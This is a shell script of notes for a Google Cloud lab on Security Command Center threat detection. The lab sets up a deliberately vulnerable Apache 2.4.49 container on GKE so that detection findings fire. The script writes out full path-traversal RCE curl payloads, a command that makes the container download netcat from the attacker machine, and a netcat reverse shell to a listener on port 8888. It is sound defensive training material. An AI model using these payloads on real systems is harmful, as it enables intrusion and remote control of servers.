# https://www.cloudskillsboost.google/paths/15/course_templates/759/labs/470720

export PROJECT_ID=qwiklabs-gcp-00-85f3e1793ea1
export REGION=us-east4
export ZONE=us-east4-c
export MASTER_AUTHORIZED_NETWORKS=10.150.0.0/20 # master-authorized-networks


gcloud config set project $PROJECT_ID
gcloud config set compute/region $REGION
gcloud config set compute/zone $ZONE


gcloud services enable securitycenter.googleapis.com
gcloud services list --enabled | grep security


# Task 1. Initiate and mitigate a threat with Event Threat Detection
## Quick run around SCC > Findings.


# Grant Access to the new prinicipal `demouser1@gmail.com`
# suspicious activities reported in Google Cloud logs such as delegating sensitive roles to an external user, such as someone who has a miscellaneous gmail.com account that isn't tied to your corporate domain 
gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
  --member='user:demouser1@gmail.com' \
  --role='roles/bigquery.admin'


# Check SCC for `Non org IAM member` and `Persistence: IAM anomalous grant`
## The service that detected `Non org IAM member` misconfiguration was `Security Health Analytics` while `Persistence: IAM anomalous grant` was detected by "Event Threat Detection"
## Source Properties > Properties > sensitiveRoleGrant field. Check `principalEmail` `bindingDetails` `members` to check the most important characteristics



# Remove Access to the new prinicipal `demouser1@gmail.com`
gcloud projects remove-iam-policy-binding $DEVSHELL_PROJECT_ID \
    --member='user:demouser1@gmail.com' \
    --role='roles/bigquery.admin'

# The Finding "Persistence: IAM anomalous grant" has not changed its status. It was initiated by the ETD service, and cannot be deactivated automatically


# +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# Task 2. Configure a cloud environment to detect threats
# To enable Resource Manager Admin Read logs
## Many logs in Google Cloud are enabled by default, but for detecting specific threats you will need to enable additional data access logs

# Enable Cloud Resource Manager API
gcloud services enable cloudresourcemanager.googleapis.com
gcloud services list --enabled | grep cloudresourcemanager

## Get the current IAM policy
gcloud projects get-iam-policy $DEVSHELL_PROJECT_ID --format="json" | tee current_policy.json

## Add the auditConfigs section to current_policy.json
jq '.auditConfigs += [{"service": "cloudresourcemanager.googleapis.com", "auditLogConfigs": [{"logType": "ADMIN_READ"}]}]' current_policy.json > updated_policy.json

## Set the updated IAM policy
gcloud projects set-iam-policy $DEVSHELL_PROJECT_ID updated_policy.json

# Now Resource Manager Data Read audit logs are collected and Event Threat Detection can analyze them.



# For reproducing the scenario, you will need to create a new virtual machine with a default Service Account and cloud-platform access scope.
gcloud compute instances create new-vm \
    --zone=$ZONE \
    --machine-type=e2-medium \
    --scopes=cloud-platform 
  
# 5 Security Findings related to the instance you just created:

## Discovery: Service Account Self-Investigation
## Full API access
## Default service account used
## Compute secure boot disabled
## Public IP address

# # in ssh
#     gcloud projects get-iam-policy $(gcloud config get project)
# Function to SSH into the VM and run the given command
get_iam_policy_from_vm() {
  local command=$1; shift;
  # shellcheck disable=SC2005
  echo "$(gcloud compute ssh new-vm --command "${command}" 2>&1)"
}

# Call the function
get_iam_policy_from_vm "gcloud projects get-iam-policy \$(gcloud config get project)"


## Open SCC > Findings. Check Last hour and look for  5 Security Findings | Discovery: Service Account Self-Investigation | Full API access | Default service account used | Compute secure boot disabled | Public IP address
## The Finding "Discovery: Service Account Self-Investigation" was initiated by Event Threat Detection (ETD), which classifies findings with the THREAT Finding Class.
## Other findings have been initiated by the Security Health Analytics component, which classifies Findings as MISCONFIGURATION.



# Mute `Discovery: Service Account Self-Investigation`


# enable full DNS query logging

gcloud dns policies create dns-test-policy \
  --project=$PROJECT_ID \
  --description="" \
  --networks="default" \
  --enable-inbound-forwarding \
  --enable-logging

## Now return to the SSH session of our virtual machine and try connecting to the malicious URL by running the following command:
gcloud compute ssh new-vm

# try connecting to the malicious URL from the SSH session of our new-vm
curl etd-malware-trigger.goog

# From SCC > Findings, you should see `Malware: Bad Domain`. Mute `Mute Options` after


# Delete new-vm
gcloud compute instances delete new-vm \
  --zone=$ZONE \
  --quiet


# Task 4. Build an environment for detecting container threats

# Container Threat Detection (CTD) is a special service that tracks suspicious activities happening inside GKE-based workloads. Currently CTD supports detection of several threats, such as:
# Added binary executed: initiated when a new binary, which was not a part of a container, is launched.
# Added library loaded: similar to the previous finding, but monitors only newly launched libraries.
# Reverse shell: a process inside of the container redirects network streams to a remote socket.
# Malicious script executed: a machine learning model analyzes behavior of launched bash scripts and reports malicious activities.
# Malicious URL observed: Container Threat Detection finds a malicious URL in the argument list of a running process. The list of malicious URLs is defined by Google's Safe Browsing Service.

# To experimenting with Container Threat Detection, create a new VM instance attacker-instance
gcloud compute instances create attacker-instance \
    --scopes=cloud-platform  \
    --zone=$ZONE \
    --machine-type=e2-medium  \
    --image-family=ubuntu-2004-lts \
    --image-project=ubuntu-os-cloud \
    --no-address

# this instance does not have any external IP addresses, so we need to modify the configuration of our VPC network to reach Google Cloud APIs by enabling Private Google Access
gcloud compute networks subnets update default \
    --region=$REGION \
    --enable-private-ip-google-access

gcloud compute ssh attacker-instance --tunnel-through-iap # you might need IAP authentication instead of ssh from cloudshell to work

# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# From here on out we will be using the attacker instance 
# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

sudo snap remove google-cloud-cli
curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-438.0.0-linux-x86_64.tar.gz
tar -xf google-cloud-cli-438.0.0-linux-x86_64.tar.gz
./google-cloud-sdk/install.sh
# N Y || No, Yes and enter

. ~/.bashrc

# Install additional authorization plugin for GKE
gcloud components install kubectl gke-gcloud-auth-plugin --quiet


# deploy a private GKE cluster on which we will launch a vulnerable version of Apache.
gcloud container clusters create test-cluster \
--zone $ZONE \
--enable-private-nodes \
--enable-private-endpoint \
--enable-ip-alias \
--num-nodes=1 \
--master-ipv4-cidr "172.16.0.0/28" \
--enable-master-authorized-networks \
--master-authorized-networks $MASTER_AUTHORIZED_NETWORKS # check if it's the same CIDR range


gcloud container clusters get-credentials test-cluster --zone $ZONE


# confirm the configuration of this DaemonSet
kubectl describe daemonsets container-watcher -n kube-system
# If `NotFound` error rerun it
while true; do
  output=$(kubectl describe daemonsets container-watcher -n kube-system 2>&1)
  
  if [[ $output != *"NotFound"* ]]; then
    echo "DaemonSet $DAEMONSET_NAME is now available."
    echo "$output"
    break
  else
    echo "DaemonSet $DAEMONSET_NAME not found. Checking again in 5 seconds..."
    sleep 5
  fi
done




# Launch a new deployment in your cluster using the vulnerable version of the Apache server:
kubectl create deployment apache-deployment \
    --replicas=1 \
    --image=us-central1-docker.pkg.dev/cloud-training-prod-bucket/scc-labs/ktd-test-httpd:2.4.49-vulnerable

# Use NodePort service to expose our `one pod one Node`
kubectl expose deployment apache-deployment \
    --name apache-test-service  \
    --type NodePort \
    --protocol TCP \
    --port 80

# find the values of the NODE_IP and the NODE_PORT 
NODE_IP=$(kubectl get nodes -o jsonpath={.items[0].status.addresses[0].address})
NODE_PORT=$(kubectl get service apache-test-service \
    -o jsonpath={.spec.ports[0].nodePort})


# VPC firewall rule allowing connection to the NODE_PORT
gcloud compute firewall-rules create apache-test-service-fw \
    --allow tcp:${NODE_PORT}
curl http://${NODE_IP}:${NODE_PORT} # Outputs: `It works!`


# one more firewall rule for making this connection to the port 8888 possible
gcloud compute firewall-rules create apache-test-rvrs-cnnct-fw --allow tcp:8888


# Now that you have prepared the vulnerable infrastructure, you can start exploiting the vulnerable software. 
# Next, you'll behave as an intruder from the internet-based VM workstation which has access to the URL http://${NODE_IP}:${NODE_PORT}. Here is a diagram that demonstrates our configuration: https://cdn.qwiklabs.com/RoyH%2BRdCyoAvFL36uQ39r19nWp%2B3o%2FEnV9G8Sldem2w%3D
# We run the "curl" command on the Attacker instance and connect to the Apache web server. In turn, the Apache web server returns its main web page.




# Task 5. Exploit a web server and detect issues with Container Threat Detection

# Run the following command to try and exploit our web server:
# In the above command, you are calling a "/bin/sh" command on the remote linux container where the Apache server is running.

curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
    --path-as-is \
    --insecure \
    --data "echo Content-Type: text/plain; echo; id"


# Check the list of files in the root directory:
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
    --path-as-is \
    --insecure \
    --data "echo Content-Type: text/plain; echo; ls -l /"


# Check the hostname of the remote host:
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
    --path-as-is \
    --insecure \
    --data "echo Content-Type: text/plain; echo; hostname"



# Running the "curl" command is a working way to explore the remote environment, but we will try to implement a Reverse Shell channel to establish interactive access to the affected environment.

# A Reverse Shell tactic is an advanced way to establish a connection from a victim machine to the attacker's host. This is a very serious security breach, and Security Command Center should immediately report any attempts of running processes to attach standard input to a remote socket.

# You can read more about this tactic on the page: Reverse Shell: How It Works, Examples and Prevention Tips. There are many ways to implement this type of attack, but we will use the classic way of using Netcat traditional.
# https://www.aquasec.com/cloud-native-academy/cloud-attacks/reverse-shell-attack/

# "Netcat traditional" has not been included into the running container, so we need to inject this piece of software to the running container. This will help us to initiate another SCC Finding about running software which was not included into the original container.

# Hackers usually prepare statically linked and precompiled pieces of software. For this lab we will use the "nc.traditional" file which is publicly available as a part of the Debian 10 package Package: netcat-traditional (1.10-41.1).

# This is a dynamically linked file dependent on two standard libraries. As our container ktd-test-httpd:2.4.49-vulnerable is based on Debian 10, the newly introduced "nc.traditional" binary can be successfully launched inside our container.

# The package itself can be downloaded from the page netcat-traditional_1.10-41.1_amd64.deb, but we have prepared a local version for you in a GCS bucket (our environment does not have any connection to the Internet).



# Download the precompiled pieces of "nc.traditional" software to the "attacker-instance" using the following set of commands to extract a binary file that we need:
gsutil cp \
gs://cloud-training/gsp1125/netcat-traditional_1.10-41.1_amd64.deb .
mkdir netcat-traditional
dpkg --extract netcat-traditional_1.10-41.1_amd64.deb netcat-traditional


# determine the local IP address of our "attacker-instance" workstation to upload "~/netcat-traditional/bin/nc.traditional" to the target container from inside of this container
LOCAL_IP=$(ip -4 addr show ens4 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

echo ${LOCAL_IP}


# Now start a primitive python-based web-server in background mode:
python3 -m http.server --bind ${LOCAL_IP} \
    --directory ~/netcat-traditional/bin/ 8888 &

# Technically this is not a fully-functional web server, this is simply a python module that helps sharing files using HTTP protocol.




# Now check whether our local web server works or not by using the curl command:
curl http://${LOCAL_IP}:8888
# You should see an HTML page representing a directory ~/netcat-traditional/bin/, which should be similar to the following


# Now we will connect to our vulnerable Apache server and force fetch the nc.traditional file from our newly launched web server. We are doing this because we cannot upload any data to this container by initiating connection from the attacker instance.
# On the container itself we initiate downloading the nc.traditional from our "attacker-instance" using the following curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc command:`
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
    --path-as-is \
    --insecure \
    --data "echo Content-Type: text/plain; echo; curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc"



# You can see the process of uploading the nc.traditional on this diagram:
# https://cdn.qwiklabs.com/4roir5DhTXeJKDrWvfwo2hc3SG3OvEWFvr0xO9mw1QI%3D

    # 1. We run the curl command on the Attacker instance and connect to the Apache
    # 2. Apache runs the curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc command using /bin/sh shell.
    # 3. The curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc command connects to the Attackers instance
    # 4. The curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc command fetches the nc.traditional binary file
    # 5. The curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc command saves the nc.traditional binary file as /tmp/nc file in the running container
    # 6. The curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc command returns the message 10.8.0.8 - - [15/Jul/2023 18:11:34] "GET /nc.traditional HTTP/1.1" 200 - to Apache
    # 7. Apache confirms that the remote command was executed successfully



# Now netcat-traditional is on the remote container. Make it executable by using the chmod +x /tmp/nc command
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
    --path-as-is \
    --insecure \
    --data "echo Content-Type: text/plain; echo; chmod +x /tmp/nc"


# On the attacker's workstation enter this command to interrupt the running Python web-service:
pkill python
# might need to press "enter" a couple of times to see this terminated message

# Run the following command to confirm there are no processes listening on any TCP ports:
lsof -i -sTCP:LISTEN


# Run the following command to launch the /tmp/nc file inside our container:
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
    --path-as-is \
    --insecure \
    --data "echo Content-Type: text/plain; echo; /tmp/nc"



# This binary file was not included into the image when the image was built, so SCC must detect it and initiate the Finding Added Binary Executed.
# In SCC, the "New threats over time" panel, find the finding `Added Binary Executed`. It's is also in Findings
# It has "Critical" Severity, which means that an intruder is able to access, modify, or delete data, or execute unauthorized code within your existing resources





# Open another ssh connection to the attacker-instance and Arrange your two SSH windows side-by-side so you can easily toggle between the two:


# In the newly launched terminal window (the 2nd session), run the netcat server listening session:
nc -nlvp 8888 # 2nd session


# In 1st session. Run the following command to launch a reverse shell session from inside the Apache container:
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
    --path-as-is \
    --insecure \
    --data "echo Content-Type: text/plain; echo; /tmp/nc ${LOCAL_IP} 8888 -e /bin/bash" # 1st session
# At the 2nd session, where you have just launched the nc -nlvp 8888 command, see a message similar to the following: `Connection received on 10.8.0.9 46686`

# in the 2nd session enter the following command:
ls -l /     # 2nd session


# The /tmp/nc ${LOCAL_IP} 8888 -e /bin/bash command establishes connection to the Attacker instance and redirects input and output of the /bin/bash to the remote nc process, running on the Attacker's instance
# The Attacker communicates with remote /bin/bash process interactively


# The attacker can develop this attack further by launching possible scenarios such as:
## Defacing the website
## Running his/her own load in this container
## Fetching the token of the Service Account and using it for exploiting the associated Google Cloud environment
# ctrl + c || ctrl + w

# SCC > Findings. In the Last hour. Ensure you see one (or two) findings for `Reverse shell`















# Bonus

gcloud projects get-iam-policy $DEVSHELL_PROJECT_ID

# +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

### To ssh and run cmd
function get_iam_policy_from_vm() {
  local vm_instance_name="new-vm"
  local zone="YOUR_VM_ZONE"  # Replace with your VM's zone

  # SSH into the VM and run the command
  gcloud compute ssh $vm_instance_name --zone=$zone --command="gcloud projects get-iam-policy \$(gcloud config get project)"
}

# Call the function
get_iam_policy_from_vm




# Function to SSH into the VM and run the given command
get_iam_policy_from_vm() {
  local command=$1; shift;
  # shellcheck disable=SC2005
  echo "$(gcloud compute ssh new-vm --command "${command}" 2>&1)"
}

# Call the function
get_iam_policy_from_vm "gcloud projects get-iam-policy \$(gcloud config get project)"

# +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++